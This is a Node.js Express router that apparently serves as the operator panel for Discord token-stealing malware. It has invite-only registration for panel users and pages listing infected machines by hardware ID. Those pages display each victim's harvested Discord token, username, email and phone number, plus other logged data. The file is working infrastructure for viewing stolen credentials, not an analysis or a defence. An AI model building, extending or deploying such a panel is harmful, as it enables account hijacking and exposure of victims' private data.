const express = require('express');
const moment = require('moment');
const passport = require('passport');
const { hashPassword } = require('../authentication');

module.exports = (app) => {
    const router = express.Router();

    router.use((req, res, next) => {
        if (req.path != '/login' && req.path != '/register') {
            if (req.isAuthenticated()) {
                return next();
            }

            return res.redirect('login');
        } else {
            if (req.isAuthenticated()) {
                return res.redirect('clients');
            }

            return next();
        }
    });

    //router.post('/login', passport.authenticate('local', { successRedirect: 'clients', failureRedirect: 'login?err=1' }));

    router.post('/login', (req, res, next) => {
        passport.authenticate('local', (err, user, info) => {
            if (err) {
                return next(err);
            }

            if (!user) {
                return res.redirect('login?err=1');
            }

            req.logIn(user, (err) => {
                if (err) {
                    return next(err);
                }

                return res.redirect('clients');
            });
        })(req, res, next);
    });

    router.get('/login', (req, res) => {
        res.render('login', { fail: req.query.err != undefined });
    });

    router.post('/register', (req, res) => {
        const username = req.body.username;
        const password = req.body.password;
        const inviteCode = req.body.invite_code;

        if (!username) return res.redirect('register?err=Missing username.');
        if (!password) return res.redirect('register?err=Missing password.');
        if (!inviteCode) return res.redirect('register?err=Missing invite code.');

        if (!username.match(/^[0-9a-zA-Z]+$/)) return res.redirect('register?err=Invalid characters in username.');
        if (username.length > 16) return res.redirect('register?err=Username too long. (max: 16 chars)');

        if (password.length > 32) return res.redirect('register?err=Password too long. (max: 32 chars)');

        const usernameCheckResult = app.db.prepare('SELECT * FROM panel_users WHERE username = ?').get(username);
        if (usernameCheckResult) return res.redirect('register?err=Username is already in use.');

        const inviteCodeResult = app.db.prepare('SELECT * FROM invite_codes WHERE code = ? AND used = 0').get(inviteCode);
        if (!inviteCodeResult) return res.redirect('register?err=Invalid invite code.');

        app.db.prepare('UPDATE invite_codes SET used = 1 WHERE code = ?').run(inviteCode);

        const salt = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
        const hashed = hashPassword(password, salt);

        app.db.prepare('INSERT INTO panel_users (username, password, salt) VALUES (?, ?, ?)').run(username, hashed, salt);

        res.redirect('login');
    });

    router.get('/register', (req, res) => {
        res.render('register', { fail: req.query.err != undefined, user: req.user });
    });

    router.get('/logout', (req, res) => {
        req.logout();
        res.redirect('login');
    });

    router.get('/clients', (req, res) => {
        res.render('clients', { user: req.user });
    });

    router.get('/clients/:hwid/discord', (req, res) => {
        const data = app.db.prepare('SELECT * FROM token_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            const tokens = JSON.parse(entry.tokens);

            tokens.forEach((token) => {
                const parsedToken = JSON.parse(token);

                tableData.push({
                    id: entry.id,
                    date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                    user: `${parsedToken.username}#${parsedToken.discriminator}`,
                    email: parsedToken.email,
                    phone: parsedToken.phone.replace(' ', '+'),
                    token: parsedToken.token,
                });
            });
        });

        res.render('clientDiscordLogs', { hwid: req.params.hwid, tableData, user: req.user });
    });

    router.get('/clients/:hwid/data', (req, res) => {
        const data = app.db.prepare('SELECT * FROM data_logs WHERE hwid = ? ORDER BY `id` DESC').all(req.params.hwid);

        let tableData = [];

        data.forEach((entry) => {
            tableData.push({
                id: entry.id,
                date: moment(entry.date).utcOffset('-0400').format('MM-DD-YYYY HH:mm A'),
                data: entry.data,
                description: entry.description || 'Not specified',
            });
        });

        res.render('clientDataLogs', { hwid: req.params.hwid, tableData, user: req.user });
    });

    router.get('/clients/:hwid', (req, res) => {
        res.render('clientInfo', { hwid: req.params.hwid, user: req.user });
    });

    return router;
};
